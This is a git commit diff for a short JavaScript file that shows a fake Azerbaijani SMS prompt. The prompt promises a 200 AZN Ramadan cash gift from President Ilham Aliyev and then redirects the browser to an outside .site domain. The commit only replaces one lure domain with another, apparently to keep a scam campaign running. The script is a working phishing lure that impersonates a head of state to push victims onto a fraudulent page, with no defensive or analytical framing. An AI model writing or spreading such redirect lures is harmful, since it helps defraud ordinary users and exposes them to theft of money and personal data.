d26570f835345a14a570209a878fc524e17984a2
usorondo26 <rent-willow2s@icloud.com>
2026-02-19 21:15:18 +0100

    Update azer.js

--- azer.js
+++ azer.js
@@ -1,5 +1,5 @@
 var password = '200 AZN ƏLDƏ EDİN'
 password = prompt('SMS: Təbrik edirik, Prezidentdən 200 AZN ƏLDƏ EDİN Nağd Ramazan Hədiyyəsi almağa haqqınız var Ilham Aliyev, təklifi indi almaq üçün OK düyməsini basın','200 AZN ƏLDƏ EDİN');
 if (password != '200 AZN ƏLDƏ EDİN') {
-    location.href ='https://www.utoeyen.site/ramadan-AZN200';
+    location.href ='https://www.ikwafang.site/ramadan-AZN200';
 }
